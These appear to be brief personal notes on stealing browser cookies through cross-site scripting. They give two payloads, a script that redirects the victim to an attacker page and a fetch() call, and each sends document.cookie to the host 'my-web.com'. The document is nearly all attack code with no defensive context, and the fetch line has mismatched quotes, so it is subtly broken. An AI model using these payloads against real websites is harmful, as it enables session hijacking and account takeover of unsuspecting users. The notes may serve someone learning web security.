


1. Stealing cookies via GET request.
   by redirecting user to malicious website 
   ex :- 
        <script>
           window.location='https://my-web.com/info?cookie='+document.cookie
        </script>
        This code redirects the victim to attackers page.

2. Using fetch() function of js.
   ex :-
      fetch("https://my-web.com/info?cookie='+document.cookie);
      It will not redirect the user to attacker's website.
      
